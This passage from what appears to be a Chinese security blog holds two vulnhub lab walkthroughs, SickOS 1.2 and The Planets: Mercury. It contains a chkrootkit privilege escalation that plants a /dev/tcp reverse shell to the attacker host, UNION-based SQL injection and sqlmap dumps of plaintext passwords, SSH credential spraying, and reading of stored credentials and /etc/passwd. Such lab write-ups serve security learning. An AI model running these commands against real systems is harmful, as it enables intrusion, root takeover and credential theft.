mlocate-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder/etc/cron.weekly:total 20drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index-rwxr-xr-x  1 root root  907 Dec 28  2012 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n\n逐条验证看下来，只有/etc/cron.daily看起来有点说法，因为下面可执行文件很多，且这些文件每天执行，看看有什么能用的吧。挨个看了看，都是些脚本，没看懂都是干啥的，直接挨个name + exp查一下有没有可以利用的漏洞吧。 \n\n发现chkrootkit存在提权漏洞。我们先鉴定一下他的版本，chkrootkit -V 0.49,刚好是有漏洞的版本。 \n查查exp： ┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ searchsploit chkrootkit 0.4   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                                                  |  Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Chkrootkit - Local Privilege Escalation (Metasploit)         | linux/local/38775.rbChkrootkit 0.49 - Local Privilege Escalation                 | linux/local/33899.txt-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n下载下来看看。  \n\n开搞之前我们先切换一下shell，因为之前4444是明显不通的，说明有防火墙过滤。所以我们试试8080这种端口，果然可以。 \n开搞 $ cat &lt;&lt; EOF &gt; update&gt; #!/bin/bash&gt; bash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1&gt; EOF$ lsVMwareDnDphp.socket-0updatevgauthsvclog.txt.0vmware-root$ cat update#!/bin/bashbash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1\n\n写完了，等了半天没反应。难道哪里出问题了？或者说他叫cron.daily我运气不好要等一天？？？ \n\n急了，尝试怎么直接运行。直接 ./chkrootkit没有任何反应。sudo也没权限。直接运行update倒是可以收到shell。网上查了一下怎么运行定时任务，没找到，突然想起定时任务里面运行是用run-parts运行的。试试看，文件夹下运行出错，查查看了下run-parts。发现他会运行指定文件下第一层的所有可执行文件。 \n试试run-parts /etc/cron.dailyOK，收到了捏。 ┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 443[sudo] password for kali: listening on [any] 443 ...192.168.56.136: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 57899bash: no job control in this shellroot@ubuntu:~# whoamiwhoamirootroot@ubuntu:~# cd ~cd ~root@ubuntu:~# lsls304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz7d03aaa2bf93d80040f3f22ec6ad9d5a.txtchkrootkit-0.49newRuleroot@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txtcat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txtWoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.Thanks for giving this try.@vulnhub: Thanks for hosting this UP!.root@ubuntu:~#\n\n目录下还有个newRules，再看一眼也不会爆炸破案了，确实是只有8080 ,443,22,80没有被过滤掉。为啥直接想到8080 ,443？因为一般为了保证web服务正常，这两端口一般都不会过滤掉的。 \n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  The Planets: Mercury","url":"/2023/05/24/THE_PLANET_%20MERCURY/","content":"\n\n\n信息收集主机发现，端口扫描，服务检测，TCP扫描，OS检测，漏洞扫描。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -sn 192.168.56.0/24                                     [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:21 CSTNmap scan report for 192.168.56.1Host is up (0.00028s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00011s latency).MAC Address: 08:00:27:17:F0:4B (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.103Host is up (0.00016s latency).MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 6.95 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.103Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:22 CSTNmap scan report for 192.168.56.103Host is up (0.00052s latency).Not shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyMAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,8080 192.168.56.103Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:23 CSTNmap scan report for 192.168.56.103Host is up (0.00041s latency).PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 c824ea2a2bf13cfa169465bdc79b6c29 (RSA)|   256 e808a18e7d5abc5c66164824570dfab8 (ECDSA)|_  256 2f187e1054f7b917a2111d8fb330a52a (ED25519)8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2|_http-server-header: WSGIServer/0.2 CPython/3.8.2|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).| http-robots.txt: 1 disallowed entry |_/| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 Not Found|     Date: Tue, 23 May 2023 13:23:21 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html|     X-Frame-Options: DENY|     Content-Length: 2366|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     &lt;!DOCTYPE html&gt;|     &lt;html lang=&quot;en&quot;&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;|     &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;|     &lt;style type=&quot;text/css&quot;&gt;|     html * &#123; padding:0; margin:0; &#125;|     body * &#123; padding:10px 20px; &#125;|     body * * &#123; padding:0; &#125;|     body &#123; font:small sans-serif; background:#eee; color:#000; &#125;|     body&gt;div &#123; border-bottom:1px solid #ddd; &#125;|     font-weight:normal; margin-bottom:.4em; &#125;|     span &#123; font-size:60%; color:#666; font-weight:normal; &#125;|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;|     vertical-align:|   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK|     Date: Tue, 23 May 2023 13:23:21 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html; charset=utf-8|     X-Frame-Options: DENY|     Content-Length: 69|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     Hello. This site is currently in development please check back later.|   RTSPRequest: |     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|_    &lt;/html&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.93%I=7%D=5/23%Time=646CBE4A%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,135,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2023\\x20May\\x202SF:023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/0\\.2\\x20CPython/3\\.8\\.2SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nX-Frame-Options:\\x2SF:0DENY\\r\\nContent-Length:\\x2069\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\SF:nReferrer-Policy:\\x20same-origin\\r\\n\\r\\nHello\\.\\x20This\\x20site\\x20is\\xSF:20currently\\x20in\\x20development\\x20please\\x20check\\x20back\\x20later\\.&quot;SF:)%r(HTTPOptions,135,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2023\\x20MSF:ay\\x202023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/0\\.2\\x20CPython/SF:3\\.8\\.2\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nX-Frame-OptiSF:ons:\\x20DENY\\r\\nContent-Length:\\x2069\\r\\nX-Content-Type-Options:\\x20nosSF:niff\\r\\nReferrer-Policy:\\x20same-origin\\r\\n\\r\\nHello\\.\\x20This\\x20site\\SF:x20is\\x20currently\\x20in\\x20development\\x20please\\x20check\\x20back\\x20lSF:ater\\.&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C//DTSF:D\\x20HTML\\x204\\.01//EN\\&quot;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\&quot;http://www\\SF:.w3\\.org/TR/html4/strict\\.dtd\\&quot;&gt;\\n&lt;html&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;Content-Type\\&quot;\\x20contSF:ent=\\&quot;text/html;charset=utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;titlSF:e&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;SF:body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20response&lt;/h1&gt;\\n\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20request\\x20version\\x20\\(&#x27;RTSP/SF:1\\.0&#x27;\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code\\x20explSF:anation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20Bad\\x20request\\x20syntax\\x2SF:0or\\x20unsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;SF:)%r(FourOhFourRequest,A28,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nDate:\\x2SF:0Tue,\\x2023\\x20May\\x202023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/SF:0\\.2\\x20CPython/3\\.8\\.2\\r\\nContent-Type:\\x20text/html\\r\\nX-Frame-OptionSF:s:\\x20DENY\\r\\nContent-Length:\\x202366\\r\\nX-Content-Type-Options:\\x20nosSF:niff\\r\\nReferrer-Policy:\\x20same-origin\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;htmSF:l\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;content-type\\&quot;SF:\\x20content=\\&quot;text/html;\\x20charset=utf-8\\&quot;&gt;\\n\\x20\\x20&lt;title&gt;Page\\x20noSF:t\\x20found\\x20at\\x20/nice\\x20ports,/Trinity\\.txt\\.bak&lt;/title&gt;\\n\\x20\\x20SF:&lt;meta\\x20name=\\&quot;robots\\&quot;\\x20content=\\&quot;NONE,NOARCHIVE\\&quot;&gt;\\n\\x20\\x20&lt;styleSF:\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20html\\x20\\*\\x20&#123;\\x20padding:0;\\xSF:20margin:0;\\x20&#125;\\n\\x20\\x20\\x20\\x20body\\x20\\*\\x20&#123;\\x20padding:10px\\x2020SF:px;\\x20&#125;\\n\\x20\\x20\\x20\\x20body\\x20\\*\\x20\\*\\x20&#123;\\x20padding:0;\\x20&#125;\\n\\x2SF:0\\x20\\x20\\x20body\\x20&#123;\\x20font:small\\x20sans-serif;\\x20background:#eee;SF:\\x20color:#000;\\x20&#125;\\n\\x20\\x20\\x20\\x20body&gt;div\\x20&#123;\\x20border-bottom:1pSF:x\\x20solid\\x20#ddd;\\x20&#125;\\n\\x20\\x20\\x20\\x20h1\\x20&#123;\\x20font-weight:normalSF:;\\x20margin-bottom:\\.4em;\\x20&#125;\\n\\x20\\x20\\x20\\x20h1\\x20span\\x20&#123;\\x20fontSF:-size:60%;\\x20color:#666;\\x20font-weight:normal;\\x20&#125;\\n\\x20\\x20\\x20\\x20SF:table\\x20&#123;\\x20border:none;\\x20border-collapse:\\x20collapse;\\x20width:10SF:0%;\\x20&#125;\\n\\x20\\x20\\x20\\x20td,\\x20th\\x20&#123;\\x20vertical-align:&quot;);MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 5.XOS CPE: cpe:/o:linux:linux_kernel:5OS details: Linux 5.0 - 5.3Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 100.85 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap --script=vuln 192.168.56.103           Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:29 CSTStats: 0:07:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 98.48% done; ETC: 21:36 (0:00:07 remaining)Nmap scan report for 192.168.56.103Host is up (0.00026s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxy| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/| http-enum: |_  /robots.txt: Robots fileMAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 522.27 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nikto -h http://192.168.56.103:8080- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.103+ Target Hostname:    192.168.56.103+ Target Port:        8080+ Start Time:         2023-05-23 21:38:54 (GMT8)---------------------------------------------------------------------------+ Server: WSGIServer/0.2 CPython/3.8.2+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html+ /static/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host+ End Time:           2023-05-23 21:46:40 (GMT8) (466 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n只开了22和8080方法，漏扫也没什么有用结果。\n简单做个网页目录发现\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo dirb http://192.168.56.103:8080                                              -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Wed May 24 15:41:43 2023URL_BASE: http://192.168.56.103:8080/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.103:8080/ ----+ http://192.168.56.103:8080/robots.txt (CODE:200|SIZE:26)                                            -----------------END_TIME: Wed May 24 15:42:18 2023DOWNLOADED: 4612 - FOUND: 1\n只发现robots.txt，并且里面没啥有用信息。再在后台挂个feroxbuster +x php,txt,asp,zip确保目录发现没有遗漏什么重要信息。但是不能闲着啊，于是我们尝试手动发现一下，惊喜的发现404页面的错误信息给我们带来了有用信息。Django错误提示告诉我们有一个目录是mercuryfacts&#x2F;那我们就看看吧底下两个连接可以看看。先看看todo发现两个有用信息：认证用的表很可能是’users’；现有的mysql请求是直接用python写的不是用django写的，很有可能存在SQL注入漏洞。问题是哪里有SQLi漏洞，先不急看看另一个页面。这个URL的1很像查询的参数，多半有问题，加个引号试试OK，不仅有SQL注入漏洞还有很详细的错误信息。那就别客气开始吧。\nExploitManual SQLi先说一下手动方法。\n\n先用order by猜列数\n\n真就1列？OK，真就1列。\n\n列数确定了就可以UNION SELECT了。\n\n先用UNION SELECT database()查库名。再用UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()查表名。注意，此处如果直接from information_schema.tables查只会得到默认库中的表名，获得不到mercury库的表信息，需要我们自己指定数据库where table_schema=database()才行。接下来UNION SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;查列名。小技巧，如果单引号被过滤可以用16进制表名绕过。东西都齐了直接查我们要的信息吧。UNION SELECT group concat(id,Ox7c,username,Ox7c,password)from users。Ox7c是’|’的hex值，主要是我们加进来为了分割一下结果。可以发现结果已经出来了。\nSQLMAP用sqlmap也可以，很快。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ --dbs┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury --tables┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T users --columns┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T users --dump\n我们将获得的结果存进一个文件里并简单处理下存进两个txt文件中供之后尝试ssh登录备用。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata +----+-------------------------------+-----------+| id | password                      | username  |+----+-------------------------------+-----------+| 1  | johnny1987                    | john      || 2  | lovemykids111                 | laura     || 3  | lovemybeer111                 | sam       || 4  | mercuryisthesizeof0.056Earths | webmaster |+----+-------------------------------+-----------+┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $3&#125;&#x27;  password                       johnny1987                     lovemykids111                  lovemybeer111                  mercuryisthesizeof0.056Earths  ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $3&#125;&#x27; &gt; pass.txt                                                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $4&#125;&#x27; &gt; username.txt\n\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo crackmapexec ssh 192.168.56.103 -u username.txt -p pass.txt --continue-on-success[sudo] password for kali: SSH         192.168.56.103  22     192.168.56.103   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1SSH         192.168.56.103  22     192.168.56.103   [-] john:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [+] webmaster:mercuryisthesizeof0.056Earths SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :lovemybeer111 Authentication failed.^C[*] Shutting down, please wait...\n发现有可以成功登录的凭证，懒得等他跑完了，直接登录吧。\nPriv Esca┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ ssh webmaster@192.168.56.103                                                          The authenticity of host &#x27;192.168.56.103 (192.168.56.103)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.56.103&#x27; (ED25519) to the list of known hosts.webmaster@192.168.56.103&#x27;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Tue 23 May 17:02:38 UTC 2023  System load:  0.0               Processes:               106  Usage of /:   74.9% of 4.86GB   Users logged in:         0  Memory usage: 30%               IPv4 address for enp0s3: 192.168.56.103  Swap usage:   0%22 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Sep  1 13:57:14 2020 from 192.168.31.136webmaster@mercury:~$ whoamiwebmasterwebmaster@mercury:~$ pwd/home/webmasterwebmaster@mercury:~/mercury_proj$ sudo -l[sudo] password for webmaster: Sorry, user webmaster may not run sudo on mercury.webmaster@mercury:~$ ls -latotal 36drwx------ 4 webmaster webmaster 4096 Sep  2  2020 .drwxr-xr-x 5 root      root      4096 Aug 28  2020 ..lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrcdrwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cachedrwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txtwebmaster@mercury:~$ cat user_flag.txt [user_flag_8339915c9a454657bd60ee58776f4ccd]\n拿到了user_flag。\nwebmaster@mercury:~$ cat .bash_history webmaster@mercury:~$ cd mercury_proj/webmaster@mercury:~/mercury_proj$ ls -latotal 28drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 .drwx------ 4 webmaster webmaster 4096 Sep  2  2020 ..-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.pydrwxrwxr-x 6 webmaster webmaster 4096 Sep  1  2020 mercury_factsdrwxrwxr-x 4 webmaster webmaster 4096 Aug 28  2020 mercury_indexdrwxrwxr-x 3 webmaster webmaster 4096 Aug 28  2020 mercury_proj-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txtwebmaster@mercury:~/mercury_proj$ cat notes.txt Project accounts (both restricted):webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMKlinuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==webmaster@mercury:~/mercury_proj$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmercury:x:1000:1000:mercury:/home/mercury:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/falsewebmaster:x:1001:1001:,,,:/home/webmaster:/bin/bashlinuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash\n先看看bash 